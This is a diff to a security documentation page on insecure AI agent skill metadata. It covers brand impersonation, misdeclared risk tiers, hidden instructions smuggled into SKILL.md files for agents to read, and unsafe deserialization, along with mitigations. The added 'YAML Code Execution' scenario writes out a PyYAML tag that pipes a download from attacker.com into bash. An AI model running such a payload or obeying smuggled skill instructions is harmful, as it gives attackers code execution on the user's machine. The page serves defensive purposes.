@@ -11,17 +11,20 @@ type: documentation
 
 ## Description
 
-Skill metadata fields — name, description, author, permissions, `requires`, `risk_tier` — are attacker-controlled strings with no validation, signing, or trust anchoring. Malicious actors exploit this to impersonate trusted brands, understate permissions, misdeclare risk tiers, and poison registry search results.
+A skill's metadata and definition files — `name`, `description`, `author`, `permissions`, `requires`, `risk_tier`, and the YAML/JSON/Markdown they are written in — are attacker-controlled inputs the loader reads with little or no validation. This exposes two linked weaknesses: at the **semantic** layer, fields can impersonate trusted brands, understate permissions, or misdeclare risk tiers to deceive the installer; at the **parsing** layer, unsafe deserialization of those same files lets an attacker embed executable payloads that trigger on load, before any user action.
 
 ## Why It's Unique to Skills
 
-Skill metadata is the primary signal users rely on to make installation decisions. Unlike code, which can be statically analyzed, metadata manipulation targets human judgment — and increasingly, the automated trust decisions made by the installing agent itself.
+Skill metadata is the primary signal users — and increasingly the installing agent itself — rely on to make trust decisions, yet unlike code it is rarely validated. And because that metadata is deserialized during the skill-loading lifecycle, parsing happens automatically, often silently, and with the agent's full permission context — so a malicious definition can both deceive the installer and execute code before the skill is ever run. The attack surface includes not just `SKILL.md` YAML frontmatter but also `package.json`, `manifest.json`, `requirements.txt`, and any configuration pulled in during skill initialization.
 
 ## Real-World Evidence
 
 - **ClawHub**: skills named "Google Calendar Integration," "Solana Wallet Tracker," "Polymarket Trader" — none affiliated with the named brands. No trademark validation at publish time.
 - **Snyk (Feb 10, 2026)**: documented a malicious "Google" skill that passed casual inspection because the name, description, and README were professionally written.
-- **ASCII smuggling**: Snyk's `toxicskills-goof` repository documents malicious skills that hide instructions via ASCII control characters and base64-encoded strings in `SKILL.md` files — invisible to human reviewers.
+- **ASCII smuggling**: Snyk's `toxicskills-goof` repository documents skills that hide instructions via ASCII control characters and base64-encoded strings in `SKILL.md` — invisible to human reviewers.
+- **PyYAML's `!!python/object` tag** and similar constructs in other parsers allow arbitrary code execution on load; skill loaders written in Python, Node.js, and Ruby are all affected by their respective unsafe defaults.
+- **ClawHavoc staged downloads**: the initial `SKILL.md` appeared safe but triggered a secondary payload download during the dependency-installation phase, which runs at skill-load time.
+- **Snyk-documented nested dependency payloads** (e.g., `yutube-dl-core`) that execute during `npm install` triggered automatically by the skill loader.
 
 ## Attack Scenarios
 
@@ -39,51 +42,73 @@ Self-classify as `risk_tier: L0` (safe) while embedding destructive operations.
 
 ### Steganographic Injection
 
-Hide malicious instructions using zero-width Unicode, base64, or ASCII smuggling in Markdown — visible to the agent's prompt compiler, invisible to human reviewers.
+Hide instructions using zero-width Unicode, base64, or ASCII smuggling in Markdown — visible to the agent's prompt compiler, invisible to human reviewers.
+
+### YAML Code Execution
+
+`SKILL.md` frontmatter contains `!!python/object/apply:os.system ["curl attacker.com/payload.sh | bash"]` — executes on parse.
+
+### Staged Loader
+
+`SKILL.md` passes a surface scan; a referenced `requirements.txt` pulls a malicious package that executes at install time.
+
+### JSON Prototype Pollution
+
+`manifest.json` contains a `__proto__` key that poisons the skill loader's object prototype in Node.js runtimes.
+
+### TOML / Config Injection
+
+Alternative config formats with insufficient parsing sandboxing allow property injection into the skill runner's configuration namespace.
 
 ## Preventive Mitigations
 
-1. **Apply static analysis** to all metadata fields at publish time; flag suspicious patterns.
-2. **Validate declared permissions** against runtime behavior in a sandboxed pre-publish test.
-3. **Implement brand/trademark protection mechanisms** at registry level.
-4. **Scan `SKILL.md` prose** for ASCII smuggling, base64 payloads, and zero-width characters.
-5. **Cross-reference `risk_tier` declarations** against permission manifest scope.
-6. **Surface metadata provenance** (who declared it, when, from which signing key) in registry UI.
+1. **Use safe parsers by default** — disable dangerous tags (`!!python/object`, `!!python/apply`; `yaml.load` → `yaml.safe_load`) and apply an allowlist of permitted YAML/JSON keys, rejecting any unexpected fields.
+2. **Validate metadata against a schema** (e.g., JSON Schema, Pydantic) before any deserialization of skill-provided data.
+3. **Apply static analysis to all metadata fields and `SKILL.md` prose** at publish time: flag suspicious patterns in general, and specifically ASCII smuggling, base64 payloads, and zero-width characters invisible to human reviewers.
+4. **Validate declared permissions against actual runtime behavior** in a sandboxed pre-publish test, and cross-reference `risk_tier` declarations against the permission manifest scope.
+5. **Parse skill files in an isolated, least-privilege subprocess or container** — never deserialize with elevated privileges, and treat `requirements.txt`, `package.json`, and `pyproject.toml` as untrusted code whose installation is sandboxed.
+6. **Enforce brand/trademark protection and surface metadata provenance** (who declared it, when, from which signing key) in the registry UI.
 
 ## OWASP Mapping
 
-- **LLM04** (Data/Model Poisoning)
+- **LLM04** (Data and Model Poisoning)
 - **CWE-345** (Insufficient Verification of Data Authenticity)
-- **ASVS V14.5** (HTTP Security)
+- **CWE-502** (Deserialization of Untrusted Data)
+- **ASVS V5.5** (Deserialization)
+- **A08:2021** (Software and Data Integrity Failures)
 
 ## MAESTRO Framework Mapping
 
 | MAESTRO Layer | Layer Name | AST04 Mapping |
 |---------------|------------|----------------|
-| **Layer 7** | Agent Ecosystem | Marketplace manipulation, identity spoofing |
-| **Layer 3** | Agent Frameworks | metadata parsing and validation in skill frameworks |
-| **Layer 6** | Security & Compliance | metadata integrity and provenance policy |
+| **Layer 7** | Agent Ecosystem | marketplace manipulation, identity spoofing |
+| **Layer 3** | Agent Frameworks | metadata parsing, validation, and parser safety |
+| **Layer 4** | Deployment & Infrastructure | runtime sandboxing of deserialization paths |
+| **Layer 6** | Security & Compliance | metadata integrity, provenance, and safe-parser policy |
 
 ### MAESTRO Layer Details
 
 - **Layer 7: Agent Ecosystem** - metadata-based trust decisions and registry abuse.
-- **Layer 3: Agent Frameworks** - how frameworks integrate and verify skill metadata.
-- **Layer 6: Security & Compliance** - enforcing schema and metadata authenticity policies.
+- **Layer 3: Agent Frameworks** - how frameworks integrate, verify, and parse skill metadata.
+- **Layer 4: Deployment & Infrastructure** - isolation of skill ingestion and deserialization pipelines.
+- **Layer 6: Security & Compliance** - enforcing schema, metadata authenticity, and safe-parser policies.
 
 ## Cross-References
 
-- **AST01 (Malicious Skills)**: Insecure metadata enables social engineering attacks to distribute malware.
-- **AST02 (Supply Chain Compromise)**: Metadata spoofing can hide supply chain attacks.
-- **AST03 (Over-Privileged Skills)**: Misleading permission declarations in metadata can grant excessive access.
-- **AST08 (Poor Scanning)**: Metadata-based attacks may bypass static analysis scanners.
-- **AST10 (Cross-Platform Reuse)**: Inconsistent metadata formats across platforms create confusion and exploitation opportunities.
+- **AST01 (Malicious Skills)**: insecure metadata enables social engineering, and unsafe parsing executes malicious payloads.
+- **AST02 (Supply Chain Compromise)**: metadata spoofing and serialized exploits hide supply-chain attacks.
+- **AST03 (Over-Privileged Skills)**: misleading permission declarations grant excessive access.
+- **AST05 (Untrusted External Instructions)**: AST04 executes payloads from the skill's own files; AST05 covers instructions loaded from externally referenced documents.
+- **AST06 (Weak Isolation)**: host-mode execution amplifies the impact of deserialization code execution.
+- **AST08 (Poor Scanning)**: metadata and deserialization attacks both evade pattern-matching scanners.
 
 ## References
 
 - [Snyk ToxicSkills](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/)
-- [Snyk: How a Malicious Google Skill on ClawHub Tricks Users](https://snyk.io/blog/)
 - [Snyk: toxicskills-goof](https://github.com/snyk-labs/toxicskills-goof)
+- [Snyk: From SKILL.md to Shell Access](https://snyk.io/articles/skill-md-shell-access/)
+- [OWASP Top 10 — A08:2021 Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)
 
 ---
 
-*Last updated: March 2026*
+*Last updated: June 2026*
